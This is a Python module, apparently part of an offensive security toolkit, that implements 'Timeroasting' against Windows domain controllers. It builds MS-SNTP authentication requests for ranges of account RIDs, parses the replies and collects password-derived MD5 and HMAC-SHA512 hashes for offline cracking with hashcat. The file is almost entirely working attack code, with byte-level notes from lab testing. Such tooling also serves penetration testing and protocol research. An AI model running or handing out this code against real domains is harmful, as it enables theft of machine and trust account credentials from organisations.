"""MS-SNTP Timeroasting: NTP packet construction and response parsing.

Implements both authentication mechanisms defined in MS-SNTP:

- **Authenticator** (68-byte, MS-SNTP 2.2.1/2.2.2): MD5-based MAC via
  ``NetrLogonComputeServerDigest`` (MS-NRPC 3.5.4.8.2).  Produces
  ``MD5(NTOWFv1 || response[:48])``.  Crackable with hashcat mode 31300.

- **ExtendedAuthenticator** (120-byte, MS-SNTP 2.2.3/2.2.4): KDF + HMAC-SHA512
  per SP800-108 section 5.1.  Used by Win8.1+ / Server 2012+.  No hashcat
  module exists for this format yet.

Empirical testing (full 0-255 byte sweep of bytes 53-55) was performed against:

- Windows Server 2022 Build 20348 (DC-SRV22-TOGO, snow.lab)
- Windows Server 2025 Build 26100 (DC-SRV25-ZEUS, snow.lab)
- Windows Server 2022 Build 20348 (DC01, evil.corp)

See ``scripts/byte_sweep_3dc.py`` for the fuzzing tool and full results.

Reference:
    MS-SNTP specification (MS-SNTP-240423)
    Secura whitepaper: Timeroasting, Trustroasting and Computer Spraying
"""

from __future__ import annotations

import hashlib
import hmac
import logging
import struct
from select import select
from socket import AF_INET, SOCK_DGRAM, socket
from time import time
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from collections.abc import Iterable

_log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# NTP client request base (48 bytes) per RFC 1305 section 3.2
# ---------------------------------------------------------------------------
#
# Byte 0: LI=0 (no warning), VN=4 (NTPv4), Mode=3 (client) = 0x23
# Byte 1: Stratum = 2 (secondary reference)
# Byte 2: Poll = 10 (1024-second interval)
# Bytes 3-47: zeros (timestamps, root delay, root dispersion, etc.)
#
# Server validates Mode (must be 1 or 3 per RFC 1305 Table 5).
# Server ignores VN, LI, Stratum, Poll, and all timestamp fields.

_NTP_CLIENT_HEADER = struct.pack("BBB", 0x23, 0x02, 0x0A) + b"\x00" * 45
_NTP_HEADER_LEN = 48
assert len(_NTP_CLIENT_HEADER) == _NTP_HEADER_LEN  # noqa: S101

# MS-SNTP 2.2.1: Key Identifier bit 31 selects current (0) or old (1) password.
_KEY_SELECTOR_OLD = 1 << 31

# Default NTP authentication port.
DEFAULT_NTP_PORT = 123

# Packet lengths (used for format detection in both send and receive).
_AUTH_LEN = 68  # Authenticator (MS-SNTP 2.2.1/2.2.2)
_EXT_AUTH_LEN = 120  # ExtendedAuthenticator (MS-SNTP 2.2.3/2.2.4)

# ExtendedAuthenticator flag values (MS-SNTP 2.2.3).
_USE_OLDKEY_VERSION = 0x01
_NTLM_PWD_HASH = 0x01


# ---------------------------------------------------------------------------
# Packet construction: 68-byte Authenticator (MS-SNTP 2.2.1)
# ---------------------------------------------------------------------------


def build_request(rid: int, *, old_pwd: bool = False) -> bytes:
    """Build a 68-byte NTP Authenticator request.

    Packet layout::

        Bytes 0-47:  NTP client header (RFC 1305).
                     Only Mode (byte 0, bits 0-2) is validated by the DC.
        Bytes 48-51: Key Identifier (uint32, little-endian).
                     Bits 0-30 = RID (account lookup).
                     Bit 31   = key selector (0 = current, 1 = previous).
        Bytes 52-67: Crypto-Checksum (16 zero bytes).
                     Server ignores this field (MS-SNTP 3.2.5.1.1 step 1.1).

    Spec vs live testing:
        All fields behave exactly per MS-SNTP 2.2.1 / 3.2.5.1.1.
        Bit 31 correctly selects current vs previous password on all tested
        DCs (Server 2022, Server 2025).  Per Appendix A <27>/<28>, if no
        previous password exists (machine accounts), the DC returns the
        current password for both key selector values.
    """
    key_selector = _KEY_SELECTOR_OLD if old_pwd else 0
    key_id = rid ^ key_selector
    return _NTP_CLIENT_HEADER + struct.pack("<I", key_id) + b"\x00" * 16


# ---------------------------------------------------------------------------
# Packet construction: 120-byte ExtendedAuthenticator (MS-SNTP 2.2.3)
# ---------------------------------------------------------------------------


def build_extended_request(rid: int, *, old_pwd: bool = False) -> bytes:
    """Build a 120-byte NTP ExtendedAuthenticator request.

    Packet layout::

        Bytes 0-47:  NTP client header (RFC 1305).
                     Same as 68-byte: only Mode is validated.
        Bytes 48-51: Key Identifier (uint32, little-endian).
                     Full 32-bit RID (no bit-31 trick like 68-byte format).
                     Used for both account lookup AND as KDF Context input.
        Byte 52:     Reserved.
                     Spec: MUST be 0x00, ignored on receipt.
                     Live: DC ignores. We send 0x00.
        Byte 53:     Flags.
                     Spec: bit 0 (USE_OLDKEY_VERSION) selects old password.
                           "MUST be set to zero" for current password.
                     Live: DC REQUIRES bit 0 = 1 or silently drops the packet.
                           128/256 values responded (all odd). All 3 DCs agree.
                           This contradicts the spec - Flags=0x00 gets no reply.
                     We send: 0x01 always.
        Byte 54:     ClientHashIDHints.
                     Spec: NTLM_PWD_HASH (0x01) MUST be set or DC drops.
                     Live: DC IGNORES this field entirely. All 256 values work.
                     We send: 0x01 (per spec, for compatibility).
        Byte 55:     SignatureHashID.
                     Spec: "MUST be set to zero" in request. Server ignores.
                     Live: DC ignores. All 256 values work. Confirmed.
                     We send: 0x00.
        Bytes 56-119: Crypto-Checksum (64 zero bytes).
                     Server ignores (MS-SNTP 3.2.5.1.1 step 2.1).

    Tested against:
        - Windows Server 2022 Build 20348 (snow.lab, evil.corp)
        - Windows Server 2025 Build 26100 (snow.lab)
        Full 0-255 sweep of bytes 53-55 confirmed identical behavior on all 3 DCs.

    Note on ``old_pwd``:
        The 120-byte format has no working mechanism to select current vs
        previous password.  The spec says Flags=0x00 → current, 0x01 → old,
        but Flags=0x00 gets no response on any tested DC.  With Flags=0x01
        always set, the DC returns whichever password it has (current for
        machine accounts that have no history, old for trust accounts that
        do).  The ``old_pwd`` parameter is accepted but has no effect on the
        wire - unlike the 68-byte format where bit 31 works correctly.
    """
    _ = old_pwd  # No effect on 120-byte packet; see docstring.
    header = struct.pack(
        "<I B B B B",
        rid,  # Bytes 48-51: Key Identifier (full 32-bit RID)
        0x00,  # Byte 52: Reserved
        _USE_OLDKEY_VERSION,  # Byte 53: Flags = 0x01 (DC requires bit 0 set)
        _NTLM_PWD_HASH,  # Byte 54: ClientHashIDHints = 0x01 (per spec)
        0x00,  # Byte 55: SignatureHashID = 0x00 (per spec)
    )
    return _NTP_CLIENT_HEADER + header + b"\x00" * 64


# ---------------------------------------------------------------------------
# Response parsing
# ---------------------------------------------------------------------------


class NtpResponse:
    """Parsed NTP authentication response.

    Response format is determined by packet length (68 vs 120 bytes),
    not by any header field.  This matches the DC's own dispatch logic
    (MS-SNTP 3.2.5.1 - server examines message length to decide format).

    68-byte response (Authenticator, MS-SNTP 2.2.2)::

        Bytes 0-47:  NTP server header (the salt for MD5).
        Bytes 48-51: Key Identifier (echoed from request).
        Bytes 52-67: Crypto-Checksum (16-byte MD5).
                     MD5(NTOWFv1 || response[0:48]).

    120-byte response (ExtendedAuthenticator, MS-SNTP 2.2.4)::

        Bytes 0-47:  NTP server header (the salt for HMAC-SHA512).
        Bytes 48-51: Key Identifier (RID, echoed from request).
        Byte 52:     Reserved.
                     Spec: MUST be 0x00.
                     Live: DC returns 0x01 on all tested DCs.
        Byte 53:     Flags.
                     Live: DC returns 0x00 regardless of request value.
        Byte 54:     ClientHashIDHints.
                     Live: DC returns 0x00 regardless of request value.
        Byte 55:     SignatureHashID.
                     Spec: server MUST set to 0x01 (NTLM_PWD_HASH).
                     Live: DC returns 0x00 on all tested DCs (Server 2022/2025).
                     This is a confirmed DC bug - the spec is clear that the
                     server "MUST set the NTLM_PWD_HASH bit to 1".
        Bytes 56-119: Crypto-Checksum (64-byte HMAC-SHA512).
                     KDF(SP800-108, HMAC-SHA512, Key=NTOWFv1,
                         Label="sntp-ms"+NUL, Context=RID(LE)) → derived_key.
                     HMAC-SHA512(derived_key, response[0:48]).

    Because SignatureHashID is unreliable (DC always returns 0x00), we
    identify the hash algorithm by packet length alone:
        68 bytes  → MD5 (hashcat 31300)
        120 bytes → KDF+HMAC-SHA512 (no hashcat module yet)
    """

    __slots__ = ("checksum", "is_extended", "rid", "salt", "sig_hash_id")

    def __init__(  # noqa: D107
        self,
        rid: int,
        salt: bytes,
        checksum: bytes,
        sig_hash_id: int = 0,
        *,
        is_extended: bool = False,
    ) -> None:
        self.rid = rid
        self.salt = salt  # 48 bytes (NTP response header)
        self.checksum = checksum  # 16 bytes (68B) or 64 bytes (120B)
        self.sig_hash_id = sig_hash_id  # Raw byte 55 from response (unreliable)
        self.is_extended = is_extended

    @property
    def md5_hash(self) -> bytes:
        """Return the 16-byte MD5 MAC (68-byte responses only).

        Raises ValueError for 120-byte responses (which use HMAC-SHA512).
        """
        if not self.is_extended:
            return self.checksum
        msg = "120-byte responses use HMAC-SHA512, not MD5. Use .checksum for the full 64-byte digest."
        raise ValueError(msg)

    @property
    def is_md5(self) -> bool:
        """True if this is a 68-byte MD5 response (crackable with hashcat 31300)."""
        return not self.is_extended

    @property
    def is_sha512(self) -> bool:
        """True if this is a 120-byte KDF+HMAC-SHA512 response.

        Identified by packet length (120 bytes), not by SignatureHashID -
        all tested DCs (Server 2022/2025) return SigHashID=0x00 despite the
        spec requiring 0x01.
        """
        return self.is_extended


def parse_response(reply: bytes, *, old_pwd: bool = False) -> NtpResponse | None:
    """Parse a 68-byte or 120-byte NTP authentication response.

    Format is determined by packet length - the only reliable indicator.
    Returns ``NtpResponse`` or ``None`` if the packet length is invalid.
    """
    if len(reply) == _AUTH_LEN:
        return _parse_auth_response(reply, old_pwd=old_pwd)
    if len(reply) == _EXT_AUTH_LEN:
        return _parse_extended_response(reply)
    return None


def _parse_auth_response(reply: bytes, *, old_pwd: bool) -> NtpResponse:
    """Parse a 68-byte Authenticator response (MS-SNTP 2.2.2).

    The Key Identifier has the old-password flag in bit 31.  We XOR it out
    to recover the plain RID.
    """
    salt = reply[:_NTP_HEADER_LEN]
    key_selector = _KEY_SELECTOR_OLD if old_pwd else 0
    rid = struct.unpack("<I", reply[48:52])[0] ^ key_selector
    checksum = reply[52:68]
    return NtpResponse(rid, salt, checksum, sig_hash_id=0, is_extended=False)


def _parse_extended_response(reply: bytes) -> NtpResponse:
    """Parse a 120-byte ExtendedAuthenticator response (MS-SNTP 2.2.4).

    The RID is the full 32-bit Key Identifier (no bit-31 masking).
    SignatureHashID (byte 55) is recorded but not used for format detection
    because all tested DCs return 0x00 instead of the spec-required 0x01.
    """
    salt = reply[:_NTP_HEADER_LEN]
    rid = struct.unpack("<I", reply[48:52])[0]
    sig_hash_id = reply[55]
    checksum = reply[56:120]
    return NtpResponse(rid, salt, checksum, sig_hash_id=sig_hash_id, is_extended=True)


# ---------------------------------------------------------------------------
# KDF + HMAC-SHA512 (MS-SNTP 3.1.5.5)
# ---------------------------------------------------------------------------


def kdf_sp800_108(key: bytes, label: bytes, context: bytes, length: int = 64) -> bytes:
    """SP800-108 counter mode KDF with HMAC-SHA512 as PRF.

    Per MS-SNTP 3.1.5.5 referencing SP800-108 section 5.1::

        K(i) = PRF(K_I, [i]_4 || Label || 0x00 || Context || [L]_4)

    Where ``[i]_4`` is a 32-bit big-endian counter starting at 1,
    and ``[L]_4`` is the desired output length in bits (big-endian).

    Two implementation details the spec leaves unspecified:

    1. **PRF = HMAC-SHA512**.  SP800-108 is generic about the PRF.
       Windows CNG uses HMAC-SHA512 (not HMAC-SHA256 as in MS-SMB2).

    2. **Null-terminated label**.  Windows passes ``"sntp-ms"`` as a
       C string with null terminator.  The SP800-108 separator then adds
       another ``0x00``, producing a double null between label and context.

    Verified on Server 2022 (Build 20348) and Server 2025 (Build 26100).
    """
    result = b""
    counter = 1
    l_bits = length * 8
    while len(result) < length:
        data = struct.pack(">I", counter) + label + b"\x00\x00" + context + struct.pack(">I", l_bits)
        result += hmac.new(key, data, hashlib.sha512).digest()
        counter += 1
    return result[:length]


def compute_extended_checksum(nt_hash: bytes, rid: int, salt: bytes) -> bytes:
    """Compute the 120-byte ExtendedAuthenticator checksum per MS-SNTP 3.1.5.5.

    Uses KDF(SP800-108, PRF=HMAC-SHA512) with a null-terminated label,
    then HMAC-SHA512 of the derived key over the 48-byte NTP response header.

    Args:
        nt_hash: NTOWFv1 (MD4 hash of UTF-16LE password), 16 bytes.
        rid: Account RID (used as KDF context, 4 bytes LE).
        salt: First 48 bytes of the NTP response.

    Returns:
        64-byte HMAC-SHA512 digest.

    """
    label = b"sntp-ms"
    context = struct.pack("<I", rid)
    derived_key = kdf_sp800_108(nt_hash, label, context, 64)
    return hmac.new(derived_key, salt, hashlib.sha512).digest()


# ---------------------------------------------------------------------------
# Single-pass roast
# ---------------------------------------------------------------------------


def ntp_roast(
    dc_ip: str,
    rids: Iterable[int],
    *,
    rate: int = 180,
    timeout: float = 24.0,
    old_pwd: bool = False,
    src_port: int = 0,
    port: int = DEFAULT_NTP_PORT,
    extended: bool = False,
) -> list[NtpResponse]:
    """Send NTP requests for a sequence of RIDs and collect responses.

    Args:
        dc_ip: Domain controller IP or hostname.
        rids: RID values to query.
        rate: Queries per second (default 180).
        timeout: Give up after this many seconds of silence.
        old_pwd: Request old/previous password (68-byte only; see
                 ``build_extended_request`` for 120-byte limitations).
        src_port: UDP source port (0 = dynamic).
        port: Destination UDP port (default 123).
        extended: Send 120-byte ExtendedAuthenticator instead of 68-byte.

    Returns:
        List of ``NtpResponse`` objects.

    """
    fmt = "extended" if extended else "authenticator"
    _log.info("Timeroast: %s:%d, %s, rate=%d/s, timeout=%ds, old_pwd=%s", dc_ip, port, fmt, rate, int(timeout), old_pwd)

    build_fn = build_extended_request if extended else build_request
    results: list[NtpResponse] = []
    seen_rids: set[int] = set()

    with socket(AF_INET, SOCK_DGRAM) as sock:
        _bind_socket(sock, src_port)

        query_interval = 1.0 / rate
        last_ok = time()
        rid_iter = iter(rids)

        while time() < last_ok + timeout:
            query_rid = next(rid_iter, None)
            if query_rid is not None:
                pkt = build_fn(query_rid, old_pwd=old_pwd)
                sock.sendto(pkt, (dc_ip, port))
                _log.debug("Sent RID %d (%s, old=%s)", query_rid, fmt, old_pwd)

            ready, _, _ = select([sock], [], [], query_interval)
            if ready:
                reply = sock.recvfrom(256)[0]
                parsed = parse_response(reply, old_pwd=old_pwd)
                if parsed is not None and parsed.rid not in seen_rids:
                    seen_rids.add(parsed.rid)
                    results.append(parsed)
                    _log.debug("Got RID %d (%s, sig=%d)", parsed.rid, "ext" if parsed.is_extended else "auth", parsed.sig_hash_id)
                    last_ok = time()

    _log.info("Timeroast: %d hashes collected", len(results))
    return results


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _bind_socket(sock: socket, src_port: int) -> None:
    try:
        sock.bind(("0.0.0.0", src_port))  # noqa: S104
    except PermissionError:
        msg = f"Cannot bind to port {src_port}. Run as root or use --src-port 0."
        raise PermissionError(msg) from None
